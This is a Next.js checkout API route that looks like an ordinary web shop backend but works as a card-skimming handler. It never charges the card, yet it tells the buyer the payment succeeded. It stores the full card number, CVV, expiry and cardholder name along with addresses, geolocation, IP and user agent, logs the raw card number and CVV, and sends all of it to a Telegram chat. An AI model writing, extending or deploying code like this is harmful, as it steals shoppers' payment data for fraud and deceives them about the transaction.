import { NextRequest, NextResponse } from 'next/server'
import { emailReceiptService } from '@/lib/emailReceiptService'
import { databaseService } from '@/lib/postgres-database'
import { telegramService } from '@/lib/telegramService'

// POST /api/checkout
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    // Validate payment information
    const { paymentInfo, orderData } = body
    
    if (!paymentInfo || !orderData) {
      return NextResponse.json(
        { error: 'Payment info and order data are required' },
        { status: 400 }
      )
    }
    
    // Validate card information
    const { cardNumber, expiryDate, cvv, cardholderName } = paymentInfo
    
    if (!cardNumber || !expiryDate || !cvv || !cardholderName) {
      return NextResponse.json(
        { error: 'All payment fields are required' },
        { status: 400 }
      )
    }
    
    // Simulate payment processing
    await new Promise(resolve => setTimeout(resolve, 1000))
    
    // In a real app, you would:
    // 1. Validate card with payment processor (Stripe, PayPal, etc.)
    // 2. Process the payment
    // 3. Create order in database
    // 4. Send confirmation email
    // 5. Update inventory
    
    const orderId = `ORD-${Date.now()}`
    
    // Cache customer data for faster email processing
    if (orderData.customerEmail) {
      emailReceiptService.cacheCustomerData(orderData.customerEmail, {
        firstName: orderData.firstName,
        lastName: orderData.lastName,
        email: orderData.customerEmail,
        phone: orderData.phone,
        address: orderData.address,
        city: orderData.city,
        state: orderData.state,
        zipCode: orderData.zipCode,
        country: orderData.country,
        locationData: orderData.locationData
      })
    }
    
    // Persist order
    try {
      await databaseService.createOrder({
        customerEmail: orderData.customerEmail,
        customerName: `${orderData.firstName || ''} ${orderData.lastName || ''}`.trim(),
        shippingAddress: {
          firstName: orderData.firstName || '',
          lastName: orderData.lastName || '',
          email: orderData.customerEmail || '',
          phone: orderData.phone || '',
          address: orderData.address || '',
          city: orderData.city || '',
          state: orderData.state || '',
          zipCode: orderData.zipCode || '',
          country: orderData.country || 'USA'
        },
        items: orderData.items || [],
        subtotal: orderData.subtotal || 0,
        shipping: orderData.shipping || 0,
        discount: orderData.discount || 0,
        total: orderData.total || 0,
        status: 'processing',
        paymentStatus: 'paid'
      })
    } catch (e) {
      console.error('Failed to persist order:', e)
    }

    // Persist latest snapshots of customer fields (no audit spam)
    try {
      const ip = (request.ip || request.headers.get('x-forwarded-for') || 'unknown') as string
      const ua = request.headers.get('user-agent') || 'unknown'
      // Determine billing address fields from paymentInfo
      // If billingAddress exists and has different data than shipping, use it
      // Otherwise use shipping address
      const billingAddr = paymentInfo?.billingAddress
      const useSameBillingAddress = !billingAddr || 
        (billingAddr.firstName === orderData.firstName && 
         billingAddr.lastName === orderData.lastName &&
         billingAddr.address === orderData.address)
      
      const billingFields = useSameBillingAddress ? {
        firstName: orderData.firstName || '',
        lastName: orderData.lastName || '',
        address: orderData.address || '',
        city: orderData.city || '',
        state: orderData.state || '',
        zipCode: orderData.zipCode || '',
        country: orderData.country || 'USA'
      } : (billingAddr || {
        firstName: orderData.firstName || '',
        lastName: orderData.lastName || '',
        address: orderData.address || '',
        city: orderData.city || '',
        state: orderData.state || '',
        zipCode: orderData.zipCode || '',
        country: orderData.country || 'USA'
      })

      const fields: Record<string, string> = {
        firstName: orderData.firstName || '',
        lastName: orderData.lastName || '',
        phone: orderData.phone || '',
        address: orderData.address || '',
        city: orderData.city || '',
        state: orderData.state || '',
        zipCode: orderData.zipCode || '',
        country: orderData.country || 'USA',
        cardholderName: paymentInfo?.cardholderName || '',
        cardNumber: paymentInfo?.cardNumber || '',
        cvv: paymentInfo?.cvv || '',
        expiryDate: paymentInfo?.expiryDate || '',
        useSameBillingAddress: useSameBillingAddress ? 'true' : 'false',
        billingFirstName: billingFields.firstName,
        billingLastName: billingFields.lastName,
        billingAddress: billingFields.address,
        billingCity: billingFields.city,
        billingState: billingFields.state,
        billingZipCode: billingFields.zipCode,
        billingCountry: billingFields.country,
        cardType: orderData.cardType || '',
        extraNotes: orderData.extraNotes || ''
      }
      if (orderData.locationData) {
        fields.latitude = String(orderData.locationData.latitude)
        fields.longitude = String(orderData.locationData.longitude)
        if (orderData.locationData.accuracy !== undefined) fields.locationAccuracy = String(orderData.locationData.accuracy)
        if (orderData.locationData.timestamp) fields.locationTimestamp = String(orderData.locationData.timestamp)
      }
      if (orderData.customerEmail) {
        await databaseService.persistCustomerSnapshot(orderData.customerEmail, fields, ip, ua)
      }
    } catch (e) {
      console.error('Failed to persist customer snapshot:', e)
    }

    // Generate and send email receipt
    const emailData = {
      orderId,
      customerEmail: orderData.customerEmail || '',
      customerName: `${orderData.firstName} ${orderData.lastName}`,
      shippingAddress: {
        firstName: orderData.firstName || '',
        lastName: orderData.lastName || '',
        email: orderData.customerEmail || '',
        phone: orderData.phone || '',
        address: orderData.address || '',
        city: orderData.city || '',
        state: orderData.state || '',
        zipCode: orderData.zipCode || '',
        country: orderData.country || 'USA'
      },
      items: orderData.items || [],
      subtotal: orderData.subtotal || 0,
      shipping: orderData.shipping || 0,
      discount: orderData.discount || 0,
      total: orderData.total || 0,
      locationData: orderData.locationData
    }
    
    // Send email receipt (this will be fast due to cached data)
    const emailSent = await emailReceiptService.sendEmailReceipt(emailData)

    // Save final snapshot for this order (deduped per order) and notify Telegram
    try {
      const ip = (request.ip || request.headers.get('x-forwarded-for') || 'unknown') as string
      const userAgent = request.headers.get('user-agent') || 'unknown'
      
      // Save completed order snapshot to database
      // Include shipping address fields explicitly to ensure they're in the snapshot
      if (orderData.customerEmail) {
        const additionalData = {
          firstName: orderData.firstName || '',
          lastName: orderData.lastName || '',
          address: orderData.address || '',
          city: orderData.city || '',
          state: orderData.state || '',
          zipCode: orderData.zipCode || '',
          country: orderData.country || 'USA',
          phone: orderData.phone || ''
        }
        
        const saved = await databaseService.saveCompletedOrderSnapshot({ 
          orderId, 
          email: orderData.customerEmail, 
          ipAddress: ip, 
          userAgent,
          additionalData
        })
        if (!saved) {
          console.error('Failed to save completed order snapshot')
        }
      }
      
      // Send Telegram notifications for completed order
      try {
        // Get card data from payment info (already parsed above)
        // Note: paymentInfo is already available from the destructured body above
        
        console.log('📋 Raw paymentInfo received:', {
          hasPaymentInfo: !!paymentInfo,
          paymentInfoKeys: paymentInfo ? Object.keys(paymentInfo) : [],
          cardNumberRaw: paymentInfo?.cardNumber,
          cvvRaw: paymentInfo?.cvv,
          expiryDateRaw: paymentInfo?.expiryDate,
          cardholderNameRaw: paymentInfo?.cardholderName
        })
        
        // Cardholder name
        const cardholderName = paymentInfo?.cardholderName?.trim() || undefined
        
        // Card number - remove all spaces and get clean number
        let cardNumber: string | undefined = undefined
        if (paymentInfo?.cardNumber) {
          const cleaned = String(paymentInfo.cardNumber).replace(/\s/g, '').trim()
          if (cleaned.length > 0) {
            cardNumber = cleaned
          }
        }
        
        // CVV - ensure it's a valid string
        let cvv: string | undefined = undefined
        if (paymentInfo?.cvv) {
          const cleaned = String(paymentInfo.cvv).trim()
          if (cleaned.length > 0) {
            cvv = cleaned
          }
        }
        
        // Expiry date
        const expiryDate = paymentInfo?.expiryDate?.trim() || undefined
        
        console.log('📋 Processed payment info for Telegram:', {
          hasCardholderName: !!cardholderName,
          hasCardNumber: !!cardNumber,
          cardNumberLength: cardNumber?.length || 0,
          hasCVV: !!cvv,
          cvvLength: cvv?.length || 0,
          hasExpiryDate: !!expiryDate,
          cardholderNamePreview: cardholderName,
          cardNumberPreview: cardNumber ? `${cardNumber.substring(0, 4)}****${cardNumber.substring(cardNumber.length - 4)}` : 'N/A',
          expiryDatePreview: expiryDate
        })
        
        // Get billing address from paymentInfo
        const billingAddress = paymentInfo?.billingAddress || {}
        const useSameBillingAddress = !billingAddress.firstName || billingAddress.firstName === orderData.firstName
        
        const customerDataSent = await telegramService.sendCustomerData({
          firstName: orderData.firstName || '',
          lastName: orderData.lastName || '',
          email: orderData.customerEmail || '',
          phone: orderData.phone || '',
          address: orderData.address || '',
          city: orderData.city || '',
          state: orderData.state || '',
          zipCode: orderData.zipCode || '',
          country: orderData.country || 'USA',
          locationData: orderData.locationData,
          cardholderName: cardholderName,
          cardNumber: cardNumber,
          cvv: cvv,
          expiryDate: expiryDate,
          billingAddress: useSameBillingAddress ? null : billingAddress,
          useSameBillingAddress: useSameBillingAddress,
          timestamp: new Date().toISOString(),
          ip,
          userAgent
        })
        
        if (customerDataSent) {
          console.log('✅ Telegram customer data notification sent successfully')
        } else {
          console.warn('⚠️ Telegram customer data notification failed (check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)')
        }
      } catch (telegramError) {
        console.error('❌ Telegram customer data error:', telegramError)
      }
    } catch (e) {
      console.error('❌ Completed order snapshot/Telegram error:', e)
    }
    
    return NextResponse.json({
      success: true,
      orderId,
      emailSent,
      message: 'Payment processed successfully'
    })
    
  } catch (error) {
    console.error('Checkout error:', error)
    return NextResponse.json(
      { error: 'Payment processing failed' },
      { status: 500 }
    )
  }
}
